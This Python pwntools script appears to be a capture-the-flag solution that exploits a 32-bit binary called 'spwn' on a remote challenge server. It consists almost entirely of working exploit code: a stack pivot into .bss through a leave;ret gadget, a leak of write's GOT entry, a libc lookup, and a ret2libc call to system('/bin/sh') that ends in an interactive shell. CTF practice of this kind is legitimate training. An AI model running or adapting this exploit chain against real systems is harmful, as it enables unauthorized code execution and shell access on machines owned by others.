from pwn import *
from LibcSearcher import *

context.binary = ELF('./spwn')
context.log_level = 'debug'
elf = context.binary
libc = context.binary.libc


def dbg():
	gdb.attach(p, 'b* 0x08048511')
	raw_input()

def exploit():
#	dbg()
	write_got = elf.got['write']
	write_plt = elf.plt['write']


	print "write_got ==> " + hex(write_got)
	print "write_plt ==> " + hex(write_plt)
	bss = 0x0804A300
	main = 0x0804849B
	leave_ret = 0x08048511
	shell = 'a'*0x18 + p32(bss-0x4) + p32(leave_ret)
	payload = p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(4)
	p.sendafter('name?', payload)
	p.sendafter('say?', shell)

	write_addr = u32(p.recv(4))
	'''
	libc.address = write_addr - libc.symbols['write']
	print "libc ==> " + hex(libc.address)
	system = libc.symbols['system']
	binsh = next(libc.search("/bin/sh"))
	'''
	libc = LibcSearcher('write', write_addr)
	libc_base = write_addr - libc.dump('write')
	print "libc_base ==> " + hex(libc_base)
	system = libc_base + libc.dump('system')
	binsh = libc_base + libc.dump('str_bin_sh')

	shell = 'b'*0x14 + p32(bss+0x20) +  p32(bss-0x4)

	payload = 'c'*0x8 +  p32(system) + p32(main) + p32(binsh)
	p.sendafter('name?', payload)
	p.sendafter('say?', shell)

	p.interactive()
	p.close()

if __name__ == '__main__':
	#p = process('./spwn')
	p = remote('node3.buuoj.cn', 29932)
	exploit()